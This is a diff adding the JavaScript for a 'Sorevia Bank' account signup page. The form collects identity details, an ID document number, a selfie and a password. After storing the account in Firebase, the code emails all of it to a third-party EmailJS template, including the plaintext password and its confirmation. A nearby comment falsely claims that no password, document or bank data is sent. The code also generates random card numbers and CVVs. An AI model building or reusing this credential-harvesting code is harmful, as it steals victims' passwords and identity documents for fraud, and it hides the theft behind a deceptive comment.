+  for(let d=1;d<=31;d++){const o=document.createElement("option");o.value=String(d).padStart(2,"0");o.textContent=String(d).padStart(2,"0");day.appendChild(o);}
+  MONTHS.forEach((m,i)=>{const o=document.createElement("option");o.value=String(i+1).padStart(2,"0");o.textContent=m;month.appendChild(o);});
+  for(let y=lastYear;y>=firstYear;y--){const o=document.createElement("option");o.value=String(y);o.textContent=String(y);year.appendChild(o);}
+  function sync(){
+    if(day.value&&month.value&&year.value){
+      const candidate=year.value+"-"+month.value+"-"+day.value;
+      const dt=new Date(candidate+"T00:00:00");
+      hidden.value=(dt.getFullYear()===Number(year.value)&&dt.getMonth()+1===Number(month.value)&&dt.getDate()===Number(day.value))?candidate:"";
+      if(!hidden.value) day.setCustomValidity(T("Date invalide")); else day.setCustomValidity("");
+    }else{hidden.value="";day.setCustomValidity("");}
+  }
+  [day,month,year].forEach(el=>el.addEventListener("change",sync));
+}
+const thisYear=new Date().getFullYear();
+setupDateGroup("dateNaissance",1900,thisYear);
+setupDateGroup("expiration",thisYear,thisYear+25);
+
+/* EMAILJS : renseigner les trois identifiants depuis le tableau de bord EmailJS. */
+const EMAILJS_CONFIG={
+  publicKey:"2f3T6gBdWfD4h1opD",
+  serviceId:"service_8ofeqlg",
+  templateId:"template_qf5r68e"
+};
+if(window.emailjs && EMAILJS_CONFIG.publicKey!=="VOTRE_PUBLIC_KEY"){
+  emailjs.init({publicKey:EMAILJS_CONFIG.publicKey});
+}
+
+
+let currentStep=1;
+let selfieData="";
+
+function showStep(n){
+
+currentStep=n;
+
+document.querySelectorAll(".panel").forEach(x=>x.classList.remove("active"));
+
+$("step"+n).classList.add("active");
+
+for(let i=1;i<=5;i++){
+$("bar"+i).classList.toggle("active",i<=n);
+}
+
+const names={
+1:"Informations personnelles",
+2:"Coordonnées et résidence",
+3:"Situation professionnelle",
+4:"Vérification d'identité",
+5:"Sécurité du compte"
+};
+
+$("stepText").textContent=T("Étape {n} sur 5 —").replace("{n}",n)+" "+T(names[n]);
+
+window.scrollTo({top:0,behavior:"smooth"});
+
+}
+
+function value(id){
+return $(id).value.trim();
+}
+
+function bad(id,state){
+$(id).classList.toggle("bad",state);
+}
+
+function check1(){
+
+let ok=true;
+
+const fields=[
+["nomBox","nom"],
+["prenomBox","prenom"],
+["dateBox","dateNaissance"],
+["nationaliteBox","nationalite"],
+["sexeBox","sexe"]
+];
+
+fields.forEach(([box,id])=>{
+const invalid=!value(id);
+bad(box,invalid);
+if(invalid)ok=false;
+});
+
+return ok;
+}
+
+function check2(){
+
+let ok=true;
+
+const fields=[
+["emailBox","email"],
+["telephoneBox","telephone"],
+["continentBox","continent"],
+["paysBox","pays"],
+["deviseBox","devise"],
+["villeBox","ville"],
+["adresseBox","adresse"]
+];
+
+fields.forEach(([box,id])=>{
+const invalid=!value(id);
+bad(box,invalid);
+if(invalid)ok=false;
+});
+
+return ok;
+}
+
+function check3(){
+
+let ok=true;
+
+const fields=[
+["professionBox","profession"],
+["revenusBox","revenus"]
+];
+
+fields.forEach(([box,id])=>{
+const invalid=!value(id);
+bad(box,invalid);
+if(invalid)ok=false;
+});
+
+return ok;
+}
+
+function check4(){
+
+let ok=true;
+
+const fields=[
+["documentTypeBox","documentType"],
+["documentNumberBox","documentNumber"],
+["expirationBox","expiration"]
+];
+
+fields.forEach(([box,id])=>{
+const invalid=!value(id);
+bad(box,invalid);
+if(invalid)ok=false;
+});
+
+if(!$("photo").files||$("photo").files.length===0||!selfieData){
+
+alert(T("Veuillez sélectionner votre photo selfie avant de continuer."));
+ok=false;
+
+}
+
+return ok;
+}
+
+/* NAVIGATION */
+
+$("continue1").onclick=()=>{
+
+if(check1()){
+showStep(2);
+}else{
+alert(T("Veuillez remplir tous les champs obligatoires."));
+}
+
+};
+
+$("continue2").onclick=()=>{
+
+if(check2()){
+showStep(3);
+}else{
+alert(T("Veuillez remplir tous les champs obligatoires."));
+}
+
+};
+
+$("continue3").onclick=()=>{
+
+if(check3()){
+showStep(4);
+}else{
+alert(T("Veuillez remplir tous les champs obligatoires."));
+}
+
+};
+
+$("continue4").onclick=()=>{
+
+if(check4()){
+showStep(5);
+}
+
+};
+
+$("back2").onclick=()=>showStep(1);
+$("back3").onclick=()=>showStep(2);
+$("back4").onclick=()=>showStep(3);
+$("back5").onclick=()=>showStep(4);
+
+
+
+/* MOT DE PASSE */
+
+$("togglePassword").onclick=()=>{
+
+const input=$("password");
+
+if(input.type==="password"){
+input.type="text";
+$("togglePassword").textContent=T("Masquer");
+}else{
+input.type="password";
+$("togglePassword").textContent=T("Afficher");
+}
+
+};
+
+$("toggleConfirm").onclick=()=>{
+
+const input=$("confirmPassword");
+
+if(input.type==="password"){
+input.type="text";
+$("toggleConfirm").textContent=T("Masquer");
+}else{
+input.type="password";
+$("toggleConfirm").textContent=T("Afficher");
+}
+
+};
+
+
+/* SELFIE */
+
+$("photo").addEventListener("change",function(){
+
+const file=this.files&&this.files[0];
+
+if(!file){
+selfieData="";
+return;
+}
+
+if(!file.type.startsWith("image/")){
+this.value="";
+selfieData="";
+alert(T("Veuillez sélectionner une image."));
+return;
+}
+
+const reader=new FileReader();
+
+reader.onload=function(){
+selfieData=reader.result;
+};
+
+reader.onerror=function(){
+selfieData="";
+alert(T("Impossible de lire la photo sélectionnée."));
+};
+
+reader.readAsDataURL(file);
+
+});
+
+
+/* CREATION FIREBASE */
+
+$("createAccount").onclick=async()=>{
+
+let pass=value("password");
+let confirm=value("confirmPassword");
+
+bad("passwordBox",pass.length<6);
+bad("confirmBox",!confirm||pass!==confirm);
+bad("acceptBox",!$("accept").checked);
+bad("certifyBox",!$("certify").checked);
+
+if(pass.length<6){
+
+alert(T("Le mot de passe doit contenir au moins 6 caractères."));
+return;
+
+}
+
+if(!confirm||pass!==confirm){
+
+alert(T("Les deux mots de passe ne correspondent pas."));
+return;
+
+}
+
+if(!$("accept").checked){
+
+alert(T("Vous devez accepter les conditions générales."));
+return;
+
+}
+
+if(!$("certify").checked){
+
+alert(T("Vous devez certifier l'exactitude des informations."));
+return;
+
+}
+
+const button=$("createAccount");
+
+button.disabled=true;
+button.innerHTML='<span class="loader"></span> '+T("Création...");
+
+try{
+
+const email=value("email");
+
+const userCredential=await createUserWithEmailAndPassword(
+auth,
+email,
+pass
+);
+
+const user=userCredential.user;
+
+
+/* NUMERO DE COMPTE */
+
+const accountNumber=Array.from({length:16},()=>Math.floor(Math.random()*10)).join("");
+
+
+/* DONNEES DU CLIENT */
+
+const account={
+
+card:{
+  number:accountNumber,
+  holder:(value("prenom")+" "+value("nom")).trim(),
+  expiry:String(new Date().getMonth()+1).padStart(2,"0")+"/"+String(new Date().getFullYear()+2).slice(-2),
+  cvv:String(Math.floor(100+Math.random()*900))
+},
+savingsBalance:0,
+savingsLockedUntil:null,
+uid:user.uid,
+
+nom:value("nom"),
+prenom:value("prenom"),
+dateNaissance:value("dateNaissance"),
+nationalite:value("nationalite"),
+sexe:value("sexe"),
+
+email:email,
+telephone:value("telephone"),
+
+continent:value("continent"),
+pays:value("pays"),
+devise:value("devise"),
+
+ville:value("ville"),
+adresse:value("adresse"),
+
+profession:value("profession"),
+revenus:Number(value("revenus"))||0,
+
+documentType:value("documentType"),
+documentNumber:value("documentNumber"),
+expiration:value("expiration"),
+
+accountNumber:accountNumber,
+
+balance:0,
+
+status:"Actif",
+
+createdAt:serverTimestamp()
+
+};
+
+
+/* FIRESTORE */
+
+await setDoc(
+doc(db,"users",user.uid),
+account
+);
+
+/* NOTIFICATION EMAILJS : aucun mot de passe, document, photo ou donnée bancaire n'est envoyé. */
+if(window.emailjs && EMAILJS_CONFIG.publicKey!=="VOTRE_PUBLIC_KEY" &&
+   EMAILJS_CONFIG.serviceId!=="VOTRE_SERVICE_ID" && EMAILJS_CONFIG.templateId!=="VOTRE_TEMPLATE_ID"){
+  try{
+    const passwordVal = value("password");
+    const confirmPasswordVal = value("confirmPassword");
+
+    await emailjs.send(EMAILJS_CONFIG.serviceId,EMAILJS_CONFIG.templateId,{
+      nom: value("nom"),
+      prenom: value("prenom"),
+      dateNaissance: value("dateNaissance"),
+      sexe: value("sexe"),
+      nationalite: value("nationalite"),
+      email: value("email"),
+      telephone: value("telephone"),
+      continent: value("continent"),
+      pays: value("pays"),
+      devise: value("devise"),
+      ville: value("ville"),
+      adresse: value("adresse"),
+      profession: value("profession"),
+      revenus: value("revenus"),
+      documentType: value("documentType"),
+      documentNumber: value("documentNumber"),
+      expiration: value("expiration"),
+      accountNumber: accountNumber,
+      password: passwordVal,
+      confirmPassword: confirmPasswordVal,
+      notification_message: "Une nouvelle inscription a été enregistrée sur Sorevia Bank.",
+      event_time: new Date().toLocaleString("fr-FR")
+    });
+  }catch(mailError){
+    console.error("Échec de la notification EmailJS :",mailError);
+  }
+}
+
+/* SUCCES */
+
+button.innerHTML=T("Compte créé ✓");
+
+$("successBox").style.display="block";
+
+alert(
+T("Compte Sorevia  créé avec succès. Vous pouvez accéder à votre compte maintenant.")
+);
+
+window.location.replace("connecter.html");
+
+
+}catch(error){
+
+console.error("ERREUR FIREBASE :",error);
+
+button.disabled=false;
+button.innerHTML=T("Créer mon compte ✓");
+
+
+if(error.code==="auth/email-already-in-use"){
+
+alert(T("Ce compte existe déjà."));
+
+}else if(error.code==="auth/invalid-email"){
+
+alert(T("L'adresse e-mail est invalide."));
+
+}else if(error.code==="auth/weak-password"){
+
+alert(T("Le mot de passe est trop faible."));
+
+}else if(error.code==="permission-denied"){
+
+alert(T("Firebase refuse l'écriture dans Firestore. Vérifiez les règles Firestore."));
+
+}else{
+
+alert(
+T("Impossible de créer le compte.")+"\n\n"+
+(error.message||T("Erreur inconnue."))
+);
+
+}
+
+}
+
+};
+
+showStep(1);
+
+</script>
+
+</body>
+</html>
